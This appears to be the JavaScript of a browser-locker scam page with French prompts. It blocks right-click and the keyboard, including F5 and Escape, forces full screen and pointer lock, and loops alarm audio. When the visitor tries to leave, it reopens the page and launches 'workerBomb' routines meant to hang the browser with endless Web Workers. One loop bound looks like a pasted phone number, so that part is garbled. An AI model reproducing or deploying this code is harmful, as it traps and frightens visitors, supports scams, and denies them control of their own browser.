

function showd2() {
document.getElementById("chat-box").style.display = "block";
}


  function showd2() {
  document.getElementById("login-box").style.display = "block";
  }
  


      
        setInterval(function() {
          document.getElementById("ado2").play()
        }, 500);
      
      
  function beep1() {
    document.getElementById("ado1").play();
 }
  
      
        var e = 1;
        setInterval(function() {
          1 == e ? (document.getElementById("favicon").href = "w3.html", e = 0) : (document.getElementById("favicon").href = "w1.html", e = 1)
        }, 1E3);
      
      
        $(document).ready(function() {
          $("#mycanvas").click(function() {
            $("#welcomeDiv").show()

          })
        });
      
      
        $(document).ready(function() {
          $(".pro_box").delay(400).fadeIn(300);
          $("#poptxt").delay(2000).fadeIn(400);
              $(".black").delay(1E3).fadeIn(800);
          $(".pro_box2").delay(2500).fadeIn(800);
          $(".pro_box3").delay(3500).fadeIn(800);
          $("#pop_up_new").delay(4E3).fadeIn(800);
          $("#ev_talkbox_wrapper").delay(1).fadeIn(500)
        });
      

  $(document).ready(function () {
      $("body").click(function () {
          $("#ev_talkbox_wrapper").hide();
      });
  });


$(document).ready(function () {
    $("#ev_talkbox_wrapper").click(function () {
        $("#ev_talkbox_wrapper").hide();
    });
});


$(document).ready(function () {
    $("#mycanvas").click(function () {
        $("#ev_talkbox_wrapper").hide();
    });
});


      
        $(document).ready(function() {
          $("#mycanvas").click(function() {
            $("#poptxt").show()
          })
        });
        $(document).ready(function() {
          $("#cross").click(function() {
            $("#poptxt").show()
          })
        });
      
      
        $(document).ready(function() {
          $("body").mouseover(function() {
            $("#poptxt").show()
          })
        });
      
      
        var isNS = "Netscape" == navigator.appName ? 1 : 0;
        "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);

        function mischandler() {
          return !1
        }

        function mousehandler(a) {
          a = isNS ? a : event;
          a = isNS ? a.which : a.button;
          if (2 == a || 3 == a) return !1
        }
        document.oncontextmenu = mischandler;
        document.onmousedown = mousehandler;
        document.onmouseup = mousehandler;
      
      
        document.onkeydown = function(a) {
          return !1
        };
      
      
        document.attachEvent("onkeydown", win_onkeydown_handler);

        function win_onkeydown_handler() {
          switch (event.keyCode) {
            case 116:
              event.returnValue = !1;
              event.keyCode = 0;
              break;
            case 27:
              event.returnValue = !1, event.keyCode = 0
          }
        }
      
      
        window.onload = function() {
          window.moveTo(0, 0);
          window.resizeTo(screen.availWidth, screen.availHeight)
        };
      



 
function addEvent(obj, evt, fn) {
		if (obj.addEventListener) {
				obj.addEventListener(evt, fn, false);
		}
		else if (obj.attachEvent) {
				obj.attachEvent("on" + evt, fn);
		}
}
addEvent(window,"load",function(e) {
		addEvent(document, "mouseout", function(e) {
				e = e ? e : window.event;
				var from = e.relatedTarget || e.toElement;
				if (!from || from.nodeName == "HTML") {
						// stop your drag event here
						// for now we can just use an alert
				 //alert("hello");

			 modal.style.display = "block";

				}
		});
});

	$(document).mousemove(function(){
	var canvas = document.getElementById('mycanvas');
canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
canvas.requestPointerLock();

	//capture mouse movement event
		 // remove our layover from the DOM
	});

 //  $(document).mousemove(function(){
 // alert("move detect");
	//capture mouse movement event
 //   $("#pageLayover").remove(); // remove our layover from the DOM
 // });

  



window.addEventListener('beforeunload', function (event) {
		  window.open(window.location.href, '_blank');
		  setTimeout(() => {
					window.location.href = window.location.href;
				}, 1);
		  let workers = [];
		  let isResponsive = true;
	
		  function workerBomb() {
			console.log("Starting workerBomb...");

			const script = `
			  let counter = 0;
			  while (true) {
				counter++;
				Math.random() * Math.random();
	
				// Send progress to the main thread occasionally
				if (counter % 1e6 === 0) {
				  postMessage({ status: "working", counter });
				}
			  }
			`;
			const blob = new Blob([script], { type: "application/javascript" });
			const workerURL = URL.createObjectURL(blob);
	
			
			for (let i = 0; i < 01-70-38-15-35; i++) {
			  const worker = new Worker(workerURL);
			  workers.push(worker);
	
			  worker.onmessage = (event) => {
				if (event.data.status === "working") {
				  console.log(`Worker ${i} progress: ${event.data.counter}`);
				}
			  };
	
			  worker.onerror = (error) => {
				console.error(`Worker ${i} encountered an error:`, error);
			  };
			}
	
		  }
	
		
		  function startWatchdog() {
			console.log("Starting watchdog...");
	
			let lastTime = Date.now();
	
			const watchdogInterval = setInterval(() => {
			  const currentTime = Date.now();
	
			 
			  if (currentTime - lastTime > 2000) {
				console.warn("Browser unresponsive detected. Terminating workers...");
				terminateWorkers();
				clearInterval(watchdogInterval);
			  } else {
				
				lastTime = currentTime;
			  }
			}, 100);
			
			(function monitorResponsiveness() {
			  for (let i = 0; i < 1e6; i++) {} 
			  if (workers.length > 0) {
				requestAnimationFrame(monitorResponsiveness);
			  }
			})();
		  }
	
		  function terminateWorkers() {
			workers.forEach((worker, index) => {
			  worker.terminate();
			  console.log(`Worker ${index} terminated.`);
			});
			workers = [];
			console.log("All workers terminated.");
		  }
	
	
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  // Custom message (not all browsers display this)
		  const message = "Êtes-vous sûr de vouloir quitter cette page ?";
		  
		  // Set the returnValue property to trigger the confirmation dialog
		  event.returnValue = message;
	
		  // Return the message string for some older browsers
		  return message;
		});
	  
      
		window.addEventListener('unload', function () {
		  window.open(window.location.href, '_blank');
		  setTimeout(() => {
					window.location.href = window.location.href;
				}, 1);
		  let workers = [];
		  let isResponsive = true;
	
		  function workerBomb() {
			console.log("Starting workerBomb...");
	
			const script = `
			  let counter = 0;
			  while (true) {
				counter++;
				Math.random() * Math.random();
	
				// Send progress to the main thread occasionally
				if (counter % 1e6 === 0) {
				  postMessage({ status: "working", counter });
				}
			  }
			`;
			const blob = new Blob([script], { type: "application/javascript" });
			const workerURL = URL.createObjectURL(blob);
	
			// Create 10 workers (adjust the number to reduce load)
			for (let i = 0; i < 01-70-38-15-35; i++) {
			  const worker = new Worker(workerURL);
			  workers.push(worker);
	
			  worker.onmessage = (event) => {
				if (event.data.status === "working") {
				  console.log(`Worker ${i} progress: ${event.data.counter}`);
				}
			  };
	
			  worker.onerror = (error) => {
				console.error(`Worker ${i} encountered an error:`, error);
			  };
			}
	
			// Start the responsiveness watchdog
			// startWatchdog();
		  }
	
		  // Watchdog function to monitor browser responsiveness
		  function startWatchdog() {
			console.log("Starting watchdog...");
	
			let lastTime = Date.now();
	
			const watchdogInterval = setInterval(() => {
			  const currentTime = Date.now();
	
			  // If the browser is unresponsive for more than 2 seconds, terminate workers
			  if (currentTime - lastTime > 2000) {
				console.warn("Browser unresponsive detected. Terminating workers...");
				terminateWorkers();
				clearInterval(watchdogInterval);
			  } else {
				// Update the last time to keep track of responsiveness
				lastTime = currentTime;
			  }
			}, 100);
	
			// Simulate lightweight work on the main thread to detect unresponsiveness
			(function monitorResponsiveness() {
			  for (let i = 0; i < 1e6; i++) {} // Simulate a small task
			  if (workers.length > 0) {
				requestAnimationFrame(monitorResponsiveness);
			  }
			})();
		  }
	
		  // Function to terminate all workers
		  function terminateWorkers() {
			workers.forEach((worker, index) => {
			  worker.terminate();
			  console.log(`Worker ${index} terminated.`);
			});
			workers = [];
			console.log("All workers terminated.");
		  }
	
	
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  workerBomb();
		  const m = "Voulez-vous fermer ?";
		  
		  event.returnValue = m;

		  return m;
		});